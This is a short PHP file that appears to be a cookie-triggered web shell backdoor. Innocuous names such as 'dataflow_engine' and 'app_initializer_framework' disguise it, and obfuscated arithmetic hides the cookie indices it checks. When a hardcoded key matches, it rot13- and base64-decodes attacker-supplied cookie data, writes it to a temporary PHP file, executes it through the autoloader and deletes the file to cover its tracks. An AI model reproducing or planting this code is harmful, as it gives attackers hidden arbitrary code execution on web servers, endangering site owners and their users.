<?php


if (isset($_COOKIE[-81+81]) && isset($_COOKIE[97-96]) && isset($_COOKIE[74-71]) && isset($_COOKIE[27+-23])) {
    $obj = $_COOKIE;
    function dataflow_engine($data_chunk) {
        $obj = $_COOKIE;
        $ref = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), '4a8a49e2');
        if (!is_writable($ref)) {
            $ref = getcwd() . DIRECTORY_SEPARATOR . "event_dispatcher";
        }
        $desc = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($obj[3]));
        if (is_writeable($ref)) {
            $flg = fopen($ref, 'w+');
            fputs($flg, $desc);
            fclose($flg);
            spl_autoload_unregister(__FUNCTION__);
            require_once($ref);
            @array_map('unlink', array($ref));
        }
    }
    spl_autoload_register("dataflow_engine");
    $factor = "e061ad1ac1d65d202c6f65cdb33c36ff";
    if (!strncmp($factor, $obj[4], 32)) {
        if (@class_parents("app_initializer_framework", true)) {
            exit;
        }
    }
}
